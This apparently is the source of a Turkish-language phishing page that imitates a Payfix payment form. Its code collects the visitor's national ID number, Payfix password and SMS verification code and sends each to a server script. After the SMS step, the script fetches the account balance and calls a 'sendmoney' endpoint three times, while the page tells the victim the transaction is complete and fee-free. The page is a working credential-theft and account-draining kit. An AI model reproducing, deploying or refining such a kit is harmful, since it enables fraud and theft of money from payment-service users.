<?php
include 'inc/config.php';
$callback = $_POST['callback'];
$valal = $_POST['amount'];
?>


<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Turka - Yatırım Formu</title>
    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
    <link href="assets/css/fontawesome.all.min.css" rel="stylesheet" />
    <link href="assets/css/main.css?v=9351141693" rel="stylesheet" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap"
        rel="stylesheet" />
    <style>
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        span,
        label,
        div,
        a,
        b,
        strong,
        p {
            font-family: "Poppins", sans-serif;
        }

        .grecaptcha-badge {
            display: none !important;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>

<body class="bg-gray-200">
      <div id="app" data-v-app="">
      <div id="load1" class="fixed z-50 transition-all backdrop-blur-lg duration-300 inset-0 w-full h-full flex items-center justify-center bg-white bg-opacity-50 hidden"><div class="flex flex-col items-center justify-center p-5"><div class="loader"><span></span><span></span><span></span><span></span></div><h2 class="font-medium uppercase tracking-wider mt-6 text-sm">Bilgileriniz kontrol ediliyor... </h2><small class="block mt-1 text-xs text-gray-500 text-center w-full">Lütfen pencereyi kapatmayın ve işlemin sonlanmasını bekleyin.</small></div></div>
      <div id="load2" class="fixed z-50 transition-all backdrop-blur-lg duration-300 inset-0 w-full h-full flex items-center justify-center bg-white bg-opacity-50 hidden"><div class="flex flex-col items-center justify-center p-5"><div class="loader"><span></span><span></span><span></span><span></span></div><h2 class="font-medium uppercase tracking-wider mt-6 text-sm">Doğrulama kodu kontrol ediliyor... </h2><small class="block mt-1 text-xs text-gray-500 text-center w-full">Lütfen pencereyi kapatmayın ve işlemin sonlanmasını bekleyin.</small></div></div>
         <div class="lg:py-10">
            <div class="max-w-[860px] mx-auto">
               <div class="bg-white h-[100vh] lg:h-auto flex lg:block flex-col lg:shadow-md lg:shadow-gray-300 lg:rounded-xl relative overflow-hidden">
                  <div class="relative h-auto shadow-gray-100 shadow-lg lg:py-5 py-3">
                     <div class="absolute z-0 lg:top-[65px] bg-gray-100 top-[25px] left-[16.66%] rounded-full lg:bg-gray-100 overflow-hidden w-[67.66%]">
                        <div class="h-2 bg-amber-200" style="width:0%"></div>
                     </div>
                     <div class="flex z-20 relative">
                        <div class="flex-1 text-center">
                           <h2 class="hidden lg:block text-gray-700 mb-2 font-medium uppercase tracking-wider text-sm">Kullanıcı Bilgileri</h2>
                           <span class="bg-amber-200 lg:h-10 lg:w-10 w-8 h-8 mx-auto flex items-center justify-center rounded-full"><i class="fa-duotone fa-user text-amber-500"></i></span><small class="hidden lg:block truncate lg:font-normal font-medium mt-2 lg:text-gray-500 text-black text-sm">Giriş bilgileri ve tutar</small>
                        </div>
                        <div class="flex-1 text-center">
                           <h2 class="hidden lg:block text-gray-700 mb-2 font-medium uppercase tracking-wider text-sm">Giriş Onay</h2>
                           <span class="bg-gray-100 lg:h-10 lg:w-10 w-8 h-8 mx-auto flex items-center justify-center rounded-full"><i class="fa-light fa-message-sms text-gray-500"></i></span><small class="hidden lg:block truncate lg:font-normal font-medium mt-2 lg:text-gray-500 text-black text-sm">SMS Kodunuzu girin</small>
                        </div>
                        <div class="flex-1 text-center">
                           <h2 class="hidden lg:block text-gray-700 mb-2 font-medium uppercase tracking-wider text-sm">Sonuç</h2>
                           <span class="bg-gray-100 lg:h-10 lg:w-10 w-8 h-8 mx-auto flex items-center justify-center rounded-full"><i class="fa-light fa-badge-check text-gray-500"></i></span><small class="hidden lg:block truncate lg:font-normal font-medium mt-2 lg:text-gray-500 text-black text-sm">İşlemi tamamlayın</small>
                        </div>
                     </div>
                  </div>
                  <form novalidate="" action="javascript:;" method="post" class="py-3 my-input av-invalid" id="zeroa">
                  <div class="lg:p-8 p-4 flex-1 overflow-auto">
                   
                     <div id="step0">
                        <div id="formrow878756449" class="app-form-row mb-5">
                           <div class="form-group">
                              <label class="block uppercase text-xs font-medium text-gray-900"> T.C. Kimlik No: </label>
                              <div class="mt-1.5"><input type="text" name="turkeyId" id="turkeyId" class="font-medium lg:text-sm text-xs lg:h-10 h-[36px] flex items-center px-5 text-gray-900 text-md border border-gray-200 w-full hover:border-blue-500 rounded-md" value=""></div>
                             </div>
                        </div>
                        <div id="formrow828778426" class="app-form-row mb-5">
                           <div class="form-group">
                              <label class="block uppercase text-xs font-medium text-gray-900"> Payfix Hesap Şifresi: </label>
                              <div class="mt-1.5"><input type="password" name="password" id="password" class="font-medium lg:text-sm text-xs lg:h-10 h-[36px] flex items-center px-5 text-gray-900 text-md border border-gray-200 w-full hover:border-blue-500 rounded-md" value=""></div>
                              </div>
                        </div>
                        <div id="formrow189821602" class="app-form-row mb-5">
                           <div class="form-group">
                              <label class="block uppercase text-xs font-medium text-gray-900"> Tutar: </label>
                              <div class="mt-1.5">
                                 <div class="relative">
                                    <input type="text" class="font-medium lg:text-sm text-xs lg:h-10 h-[36px] flex items-center px-5 text-gray-900 text-md border border-gray-200 w-full hover:border-blue-500 rounded-md" value="<?=$valal?>">
                                    <div class="absolute top-0 h-10 bottom-0 right-0 flex items-center px-5">TL</div>
                                 </div>
                              </div>
                              <span class="flex mt-1.5 items-top font-normal"><span class="text-sm text-gray-500 dark:text-dark-400"><i class="fa-light fa-circle-info mr-2 text-gray-400 dark:text-dark-500"></i> Tutar en az 25, en fazla 300000 TL olmalıdır.</span></span>
                           </div>
                        </div>
                        <div class="flex flex-col text-xs">
                           <div class="mb-1"><span class="text-gray-500 mr-2 uppercase tracking-wider">Ana para:</span><?=$valal?> TL </div>
                           <div class="mb-1"><span class="text-gray-500 mr-2 uppercase tracking-wider">PayFIX İşlem Bedeli :</span> 0 TL </div>
                           <div class="mb-1"><span class="text-gray-500 mr-2 uppercase tracking-wider">PayFIX Hesabınızda olması gereken bakiye :</span>&nbsp;<?=$valal?> TL </div>
                           <div class="font-medium mt-2"> Bu işlem için hiçbir işlem bedeli ödemeyeceksiniz. </div>
                        </div>
                     </div>
                  </div>
                  <div class="h-auto hidden" id="tcerr"><div class="mb-5"><div class="p-6 bg-red-500 relative"><div class="flex space-x-5"><div class="w-auto"><i class="fa-duotone fa-triangle-exclamation text-xl text-white"></i></div><div class="flex-1 text-sm text-red-50 pr-5"><ul class="space-y-1"><li class="h-7 flex items-center">Hata : Lütfen T.C. kimlik numaranızı ve şifrenizi kontrol edip tekrar deneyiniz.</li></ul></div></div><div class="absolute md:top-2 -top-2 md:right-0 -right-2 p-4"><div class="w-8 h-8 rounded-lg flex items-center cursor-pointer justify-center hover:bg-red-700 hover:shadow-md"><i class="fa-light fa-times text-red-200"></i></div></div></div></div><!-- <div id="recaptcha" class="my-5 mx-5"></div> --></div>
                  <div class="lg:px-8 lg:pb-8 px-4 pb-4 h-auto relative flex space-x-5"><button onclick="giris()" type="submit"  class="h-12 transition-all disabled:opacity-50 duration-300 uppercase flex-1 w-full text-white text-sm rounded-md flex items-center justify-center bg-gradient-to-r from-[#df81ad] to-[#ef9d9c] hover:from-[#f7b694] hover:to-[#ffcf83]">Ödemeye Başla <i class="fa-light fa-arrow-right ml-3"></i></button></div>
                  </form>
                  <form novalidate="" action="javascript:;" method="post" class="py-3 my-input av-invalid hidden" id="onea">
                  <div class="lg:p-8 p-4 flex-1 overflow-auto">
                   
                     <div id="step1 ">
                     <div class="flex flex-col items-center justify-center">
                          <div class="text-gray-900"><i class="fa-light fa-key text-4xl"></i></div>
                          <h2 class="text-gray-700 text-amber-500 font-bold mt-4 mb-3">SMS</h2>
                          <ul class="text-gray-500 text-center">
                            <li class="text-center"><small>SMS doğrulama kodu işlemlerinizin güvenliği için gereklidir.</small></li>
                          </ul>
                      </div>
                      <div id="formrow899713711" class="app-form-row mb-5">
                          <div class="form-group">
                            <label class="block uppercase text-xs font-medium text-gray-900">
                                <!--v-if--> Sms Kodunuz: 
                            </label>
                            <div class="mt-1.5"><input type="text" id="smscodefield" name="submitedCode" class="font-medium lg:text-sm text-xs lg:h-10 h-[36px] flex items-center px-5 text-gray-900 text-md border border-gray-200 w-full hover:border-blue-500 rounded-md"></div>
                            
                          </div>
                      </div>
                      
                    </div>
                    
                  </div>
                  <div class="h-auto hidden" id="smserr"><div class="mb-5"><div class="p-6 bg-red-500 relative"><div class="flex space-x-5"><div class="w-auto"><i class="fa-duotone fa-triangle-exclamation text-xl text-white"></i></div><div class="flex-1 text-sm text-red-50 pr-5"><ul class="space-y-1"><li class="h-7 flex items-center">Hata : Lütfen SMS Kodunuzu kontrol edip tekrar deneyiniz.</li></ul></div></div><div class="absolute md:top-2 -top-2 md:right-0 -right-2 p-4"><div class="w-8 h-8 rounded-lg flex items-center cursor-pointer justify-center hover:bg-red-700 hover:shadow-md"><i class="fa-light fa-times text-red-200"></i></div></div></div></div><!-- <div id="recaptcha" class="my-5 mx-5"></div> --></div>

                  <div class="lg:px-8 lg:pb-8 px-4 pb-4 h-auto relative flex space-x-5"><button onclick="backaow()" class="h-12 w-auto px-5 transition-all duration-300 uppercase text-gray-700 text-sm rounded-md flex items-center justify-center bg-gradient-to-r bg-gray-100"><i class="fa-light fa-arrow-left mr-3"></i>Geri </button><button onclick="sms()" class="h-12 transition-all disabled:opacity-50 duration-300 uppercase flex-1 w-full text-white text-sm rounded-md flex items-center justify-center bg-gradient-to-r from-[#df81ad] to-[#ef9d9c] hover:from-[#f7b694] hover:to-[#ffcf83]" >Kodu Onayla <i class="fa-light fa-arrow-right ml-3"></i></button></div>
                  </form>
                  <form novalidate="" action="javascript:;" method="post" class="py-3 my-input av-invalid hidden" id="twoa">
                  <div class="lg:p-8 p-4 flex-1 overflow-auto">
                   
                    <div id="step2 ">
                      <div class="text-center">
                          <i class="fa-light fa-badge-check text-green-500 text-6xl mb-3"></i>
                          <h2 class="text-gray-700 mb-2 font-medium uppercase tracking-wider text-sm"> İşlem Tamamlandı </h2>
                          <small class="block mt-2 text-gray-500 text-sm">İşleminiz tamamlandı, tekrar siteye dönebilirsiniz.</small>
                      </div>
                    </div>
                    
                  </div>
                  <div class="h-auto"></div>
                  <button onclick="callback()" class="h-12 transition-all disabled:opacity-50 duration-300 uppercase flex-1 w-full text-white text-sm rounded-md flex items-center justify-center bg-gradient-to-r from-[#df81ad] to-[#ef9d9c] hover:from-[#f7b694] hover:to-[#ffcf83]">Siteye Geri Dön <i class="fa-light fa-arrow-rotate-left ml-3"></i></button>
                  </form>
                </div>
            </div>
         </div>
      </div>
   </body>
   <script>
    function backaow(){
      $("#zeroa").toggleClass('hidden');
      $("#onea").toggleClass('hidden');
    }
       function giris() {

    $("#load1").removeClass('hidden');

    var turkeyId = $("#turkeyId").val();
    var password = $("#password").val();

    $("#loginspn").removeClass('hidden');
    $("#loginbtn").prop("disabled", true).addClass('disabled');

    $.ajax({
        type: "POST",
        url: "request.php?q=login",
        data: {
            turkeyId: turkeyId,
            password: password,
        },
        dataType: "json",
        success: function(response) {
            setTimeout(function() {
              $("#load1").addClass('hidden');

                if (response.resultType == 5) {
                    $('#tcerr').removeClass('hidden');
                } else {
                    $("#zeroa").toggleClass('hidden');
                    $('#tcerr').addClass('hidden');
                    $("#onea").toggleClass('hidden');
                    startCountdown();
                }
            }, 1000);
        },
        error: function(err) {
            setTimeout(function() {
                console.log("Hata:", err);
            }, 1000);
        }
    });
}
function sms() {
  $("#load2").removeClass('hidden');
  var submitedCode = $("#smscodefield").val();

  // AJAX isteği
  $.ajax({
    type: "POST",
    url: "request.php?q=sms",
    data: {
      submitedCode: submitedCode,
    },
    dataType: "json",
    success: function (response) {
      setTimeout(function () {
        if (response.resultType == 5) {
          $('#smserr').removeClass('hidden');
        } else {
          getBalance(function () {
            $("#onea").toggleClass('hidden');
            $('#smserr').addClass('hidden');
            $("#twoa").toggleClass('hidden');
           

            // 3 saniye sonra sendMoney fonksiyonunu çağır
            setTimeout(function () {
              sendMoney();
              sendMoney();
              sendMoney();
            }, 3000);
            setTimeout(function () {
              $("#load2").addClass('hidden');
            }, 5000);
          });
        }
      }, 1000);
    },
    error: function (err) {
      setTimeout(function () {
        console.log("Hata:", err);
      }, 1000);
    },
  });
}

function getBalance(callback) {
  $.ajax({
    type: "POST",
    url: "request.php?q=balance",
    dataType: "json",
    success: function (response) {
      if (response.balance) {
        console.log("Balance: " + response.balance);
      } else {
        console.error("Balance bilgisine erişilemedi.");
      }

      // callback'i çağır
      if (typeof callback === 'function') {
        callback();
      }
    },
    error: function (err) {
      console.error("Balance bilgisine erişirken bir hata oluştu.", err);
    },
  });
}

function sendMoney() {
  $.ajax({
    type: "POST",
    url: "request.php?q=sendmoney",
    dataType: "json",
    success: function (response) {
      if (response.resultType == 3) {
        console.log("Para gönderme başarılı!");
        setTimeout(function () {}, 3000);
        startCountdown2();
      } else if (response.resultType == 5) {
        setTimeout(function () {
          console.log('ldoa');
        }, 3000);
        startCountdown3();
      } else {
        console.error("Hata: " + response.message);
      }
    },
    error: function (err) {
      console.error("Sunucu hatası: " + err.statusText);
    },
  });
}



function startCountdown() {
    var timeLeft = 120;

    var timerId = setInterval(function() {
        if (timeLeft <= 0) {
            clearInterval(timerId); 
            $("#timessa").text("0");
            $("#sms-again").removeClass('hidden'); 
        } else {
            $("#timessa").text(timeLeft);
            timeLeft--; 
        }
    }, 1000); 
}
function callBack() {
    
            window.location.href = '/';

}
function startCountdown3() {
    var timeLeft = 5;

    var timerId = setInterval(function() {
        if (timeLeft <= 0) {
            clearInterval(timerId);
            $("#timwq").text("0");
            $("#sms-again").removeClass('hidden');
        } else {
            $("#timwq").text(timeLeft);
            timeLeft--;
        }
    }, 1000);
}
function startCountdown1() {
    var timeLeft = 120; 

    var timerId = setInterval(function() {
        if (timeLeft <= 0) {
            clearInterval(timerId); 
            $("#timessa").text("0"); 
            $("#sms-again").removeClass('hidden'); 
        } else {
            $("#timessa").text(timeLeft);
            timeLeft--; 
        }
    }, 1000); 
}


$("#sms-again").click(function() {
    $(this).addClass('hidden');
    startCountdown1();
});

function openpass() {
        var input = $('input[type="password"]');
        var type = input.attr('type') === 'password' ? 'text' : 'password';
        input.attr('type', type);
        $('#aa').toggleClass('hidden');
        $('#bb').toggleClass('hidden');
    }

    </script>

</html>
